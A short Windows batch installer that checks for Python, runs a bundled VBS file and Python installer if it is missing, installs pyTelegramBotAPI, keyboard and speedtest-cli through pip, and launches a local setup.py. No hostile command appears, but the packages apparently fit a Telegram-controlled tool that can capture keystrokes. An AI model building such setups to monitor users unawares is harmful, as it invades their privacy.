
@echo off


if not exist "C:\Users\%USERNAME%\AppData\Local\Programs\Python" (
start "" data\havenopython.vbs
timeout 10
start "" data\python_install.exe
exit 
)


start cmd.exe /c "py -m pip install --upgrade pip"


start cmd.exe /c "pip install pyTelegramBotAPI"


start cmd.exe /c "pip install keyboard"

start cmd.exe /c "pip install speedtest-cli"

start "" data\setup.py
